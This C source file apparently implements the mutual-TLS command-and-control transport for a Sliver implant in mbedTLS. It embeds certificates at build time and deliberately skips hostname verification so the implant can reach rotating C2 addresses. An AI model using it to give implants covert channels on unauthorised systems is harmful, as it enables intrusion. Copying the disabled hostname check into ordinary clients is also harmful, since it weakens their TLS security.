/* src/transport/tls_client.c - TLS 1.3 mutual-auth client.
 *
 * Mirrors the Go implementation in implant/sliver/transports/mtls/mtls.go:
 *   - client certificate + key are injected at build time
 *   - the peer is only checked against the embedded CA (no hostname check)
 *   - TLS 1.3 is the minimum and maximum version
 *   - immediately after the handshake the implant writes "MUX/1" and starts
 *     yamux framing
 */
#include "sliver/transport.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "mbedtls/ctr_drbg.h"
#include "mbedtls/entropy.h"
#include "mbedtls/error.h"
#include "mbedtls/pk.h"
#include "mbedtls/ssl.h"
#include "mbedtls/x509_crt.h"
#include "sliver/crypto.h"
#include "sliver/log.h"
#include "sliver/platform.h"

struct sliver_tls {
  sliver_socket_t *sock;
  mbedtls_ssl_context ssl;
  mbedtls_ssl_config conf;
  mbedtls_x509_crt ca;
  mbedtls_x509_crt cert;
  mbedtls_pk_context key;
  mbedtls_ctr_drbg_context drbg;
  mbedtls_entropy_context entropy;
  int ssl_init;
  int conf_init;
  int ca_init;
  int cert_init;
  int key_init;
  int drbg_init;
  int entropy_init;
};

static int rng_adapter(void *ctx, unsigned char *out, size_t len) {
  (void)ctx;
  return sliver_random_bytes(out, len) == 0 ? 0 : -1;
}

/* Sliver only cares that the peer certificate chains to the embedded CA; the
 * hostname is irrelevant (the C2 address rotates). */
static int verify_chain_only(void *ctx, mbedtls_x509_crt *crt, int depth, uint32_t *flags) {
  mbedtls_x509_crt *ca = (mbedtls_x509_crt *)ctx;
  uint32_t verify_flags = 0;
  if (depth != 0) {
    /* Intermediate levels are handled by the chain verification below. */
    return 0;
  }
  if (mbedtls_x509_crt_verify(crt, ca, NULL, NULL, &verify_flags, NULL, NULL) != 0 ||
      verify_flags != 0) {
    *flags |= verify_flags;
    return MBEDTLS_ERR_X509_CERT_VERIFY_FAILED;
  }
  /* Trusted chain: drop any hostname related flag mbedTLS may have set. */
  *flags = 0;
  return 0;
}

static void set_err(char *err, size_t err_len, const char *msg) {
  if (err != NULL && err_len != 0) {
    (void)snprintf(err, err_len, "%s", msg);
  }
}

/* PEM blobs travel through config.json -> CMake -> a C string literal. Depending
 * on the tool chain that produced them the newlines can arrive either as real
 * newlines or as a literal backslash-n sequence; mbedTLS only accepts the
 * former. Normalise both forms (and \r) before parsing. */
static char *normalize_pem(const char *pem) {
  size_t len;
  char *out;
  size_t o = 0;
  int has_real_newline = 0;

  if (pem == NULL) {
    return NULL;
  }
  len = strlen(pem);
  for (size_t i = 0; i < len; ++i) {
    if (pem[i] == '\n') {
      has_real_newline = 1;
      break;
    }
  }
  out = (char *)malloc(len + 1);
  if (out == NULL) {
    return NULL;
  }
  for (size_t i = 0; i < len; ++i) {
    char c = pem[i];
    if (c == '\\' && i + 1 < len) {
      char n = pem[i + 1];
      if (n == 'n') {
        out[o++] = '\n';
        i++;
        continue;
      }
      if (n == 'r') {
        out[o++] = '\r';
        i++;
        continue;
      }
      if (n == '\\') {
        out[o++] = '\\';
        i++;
        continue;
      }
    }
    if (!has_real_newline && c == '\r') {
      continue;
    }
    out[o++] = c;
  }
  out[o] = '\0';
  return out;
}

static int bio_send(void *ctx, const unsigned char *buf, size_t len) {
  sliver_tls_t *conn = (sliver_tls_t *)ctx;
  long n = sliver_socket_send(conn->sock, buf, len);
  if (n <= 0) {
    return MBEDTLS_ERR_SSL_WANT_WRITE;
  }
  return (int)n;
}

static int bio_recv(void *ctx, unsigned char *buf, size_t len) {
  sliver_tls_t *conn = (sliver_tls_t *)ctx;
  long n = sliver_socket_recv(conn->sock, buf, len);
  if (n == 0) {
    return MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY;
  }
  if (n < 0) {
    return MBEDTLS_ERR_SSL_WANT_READ;
  }
  return (int)n;
}

static void tls_free(sliver_tls_t *conn) {
  if (conn == NULL) {
    return;
  }
  if (conn->ssl_init) {
    (void)mbedtls_ssl_close_notify(&conn->ssl);
    mbedtls_ssl_free(&conn->ssl);
  }
  if (conn->conf_init) {
    mbedtls_ssl_config_free(&conn->conf);
  }
  if (conn->key_init) {
    mbedtls_pk_free(&conn->key);
  }
  if (conn->cert_init) {
    mbedtls_x509_crt_free(&conn->cert);
  }
  if (conn->ca_init) {
    mbedtls_x509_crt_free(&conn->ca);
  }
  if (conn->drbg_init) {
    mbedtls_ctr_drbg_free(&conn->drbg);
  }
  if (conn->entropy_init) {
    mbedtls_entropy_free(&conn->entropy);
  }
  if (conn->sock != NULL) {
    sliver_socket_close(conn->sock);
  }
  free(conn);
}

int sliver_tls_connect(sliver_tls_t **out, const char *host, uint16_t port,
                       const char *ca_pem, const char *cert_pem, const char *key_pem,
                       char *err, size_t err_len) {
  sliver_tls_t *conn;
  int rc;

  if (out == NULL || host == NULL || ca_pem == NULL || cert_pem == NULL || key_pem == NULL) {
    set_err(err, err_len, "tls: missing arguments");
    return -1;
  }
  *out = NULL;

  conn = (sliver_tls_t *)calloc(1, sizeof(*conn));
  if (conn == NULL) {
    set_err(err, err_len, "tls: out of memory");
    return -1;
  }
  mbedtls_ssl_init(&conn->ssl);
  conn->ssl_init = 1;
  mbedtls_ssl_config_init(&conn->conf);
  conn->conf_init = 1;
  mbedtls_x509_crt_init(&conn->ca);
  conn->ca_init = 1;
  mbedtls_x509_crt_init(&conn->cert);
  conn->cert_init = 1;
  mbedtls_pk_init(&conn->key);
  conn->key_init = 1;
  mbedtls_ctr_drbg_init(&conn->drbg);
  conn->drbg_init = 1;
  mbedtls_entropy_init(&conn->entropy);
  conn->entropy_init = 1;

  if (mbedtls_ctr_drbg_seed(&conn->drbg, mbedtls_entropy_func, &conn->entropy,
                            (const unsigned char *)"sliver-tls", 10) != 0) {
    set_err(err, err_len, "tls: drbg seed failed");
    tls_free(conn);
    return -1;
  }
  {
    char *ca = normalize_pem(ca_pem);
    char *cert = normalize_pem(cert_pem);
    char *key = normalize_pem(key_pem);
    int parse_rc;

    if (ca == NULL || cert == NULL || key == NULL) {
      free(ca);
      free(cert);
      free(key);
      set_err(err, err_len, "tls: out of memory while normalising PEM");
      tls_free(conn);
      return -1;
    }
    parse_rc = mbedtls_x509_crt_parse(&conn->ca, (const unsigned char *)ca, strlen(ca) + 1);
    if (parse_rc != 0) {
      if (err != NULL) {
        (void)snprintf(err, err_len,
                       "tls: cannot parse CA certificate (rc=-0x%04x, %u bytes, starts '%.24s')",
                       -parse_rc, (unsigned)strlen(ca), ca);
      }
      free(ca);
      free(cert);
      free(key);
      tls_free(conn);
      return -1;
    }
    parse_rc = mbedtls_x509_crt_parse(&conn->cert, (const unsigned char *)cert, strlen(cert) + 1);
    if (parse_rc != 0) {
      if (err != NULL) {
        (void)snprintf(err, err_len, "tls: cannot parse client certificate (rc=-0x%04x)", -parse_rc);
      }
      free(ca);
      free(cert);
      free(key);
      tls_free(conn);
      return -1;
    }
    parse_rc = mbedtls_pk_parse_key(&conn->key, (const unsigned char *)key, strlen(key) + 1,
                                    NULL, 0, rng_adapter, NULL);
    if (parse_rc != 0) {
      if (err != NULL) {
        (void)snprintf(err, err_len, "tls: cannot parse client key (rc=-0x%04x)", -parse_rc);
      }
      free(ca);
      free(cert);
      free(key);
      tls_free(conn);
      return -1;
    }
    free(ca);
    free(cert);
    free(key);
  }

  if ((rc = mbedtls_ssl_config_defaults(&conn->conf, MBEDTLS_SSL_IS_CLIENT,
                                        MBEDTLS_SSL_TRANSPORT_STREAM,
                                        MBEDTLS_SSL_PRESET_DEFAULT)) != 0) {
    set_err(err, err_len, "tls: ssl_config_defaults failed");
    tls_free(conn);
    return -1;
  }

  /* TLS 1.3 only, like the Sliver server. */
  (void)mbedtls_ssl_conf_min_tls_version(&conn->conf, MBEDTLS_SSL_VERSION_TLS1_3);
  (void)mbedtls_ssl_conf_max_tls_version(&conn->conf, MBEDTLS_SSL_VERSION_TLS1_3);

  mbedtls_ssl_conf_rng(&conn->conf, mbedtls_ctr_drbg_random, &conn->drbg);
  mbedtls_ssl_conf_ca_chain(&conn->conf, &conn->ca, NULL);
  mbedtls_ssl_conf_authmode(&conn->conf, MBEDTLS_SSL_VERIFY_REQUIRED);
  mbedtls_ssl_conf_verify(&conn->conf, verify_chain_only, &conn->ca);
  if ((rc = mbedtls_ssl_conf_own_cert(&conn->conf, &conn->cert, &conn->key)) != 0) {
    set_err(err, err_len, "tls: conf_own_cert failed");
    tls_free(conn);
    return -1;
  }

  if ((rc = mbedtls_ssl_setup(&conn->ssl, &conn->conf)) != 0) {
    set_err(err, err_len, "tls: ssl_setup failed");
    tls_free(conn);
    return -1;
  }
  /* SNI is sent when a hostname is set; the peer certificate hostname is not
   * verified (verify_chain_only), matching the Go implant. */
  (void)mbedtls_ssl_set_hostname(&conn->ssl, host);

  conn->sock = sliver_tcp_connect(host, port);
  if (conn->sock == NULL) {
    set_err(err, err_len, "tls: tcp connect failed");
    tls_free(conn);
    return -1;
  }
  mbedtls_ssl_set_bio(&conn->ssl, conn, bio_send, bio_recv, NULL);

  while ((rc = mbedtls_ssl_handshake(&conn->ssl)) != 0) {
    if (rc != MBEDTLS_ERR_SSL_WANT_READ && rc != MBEDTLS_ERR_SSL_WANT_WRITE) {
      char detail[128];
      mbedtls_strerror(rc, detail, sizeof(detail));
      if (err != NULL) {
        (void)snprintf(err, err_len, "tls: handshake failed rc=-0x%04x (%s)", -rc, detail);
      }
      tls_free(conn);
      return -1;
    }
  }
  if (err != NULL && err_len != 0) {
    err[0] = '\0';
  }
  *out = conn;
  return 0;
}

long sliver_tls_write(sliver_tls_t *conn, const void *buf, size_t len) {
  int rc;
  if (conn == NULL) {
    return -1;
  }
  rc = mbedtls_ssl_write(&conn->ssl, (const unsigned char *)buf, len);
  return rc < 0 ? -1 : (long)rc;
}

long sliver_tls_read(sliver_tls_t *conn, void *buf, size_t len) {
  int rc;
  if (conn == NULL) {
    return -1;
  }
  rc = mbedtls_ssl_read(&conn->ssl, (unsigned char *)buf, len);
  if (rc == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY) {
    return 0;
  }
  return rc < 0 ? -1 : (long)rc;
}

const char *sliver_tls_version(sliver_tls_t *conn) {
  if (conn == NULL) {
    return "?";
  }
  return mbedtls_ssl_get_version(&conn->ssl);
}

const char *sliver_tls_ciphersuite(sliver_tls_t *conn) {
  if (conn == NULL) {
    return "?";
  }
  return mbedtls_ssl_get_ciphersuite(&conn->ssl);
}

void sliver_tls_close(sliver_tls_t *conn) { tls_free(conn); }
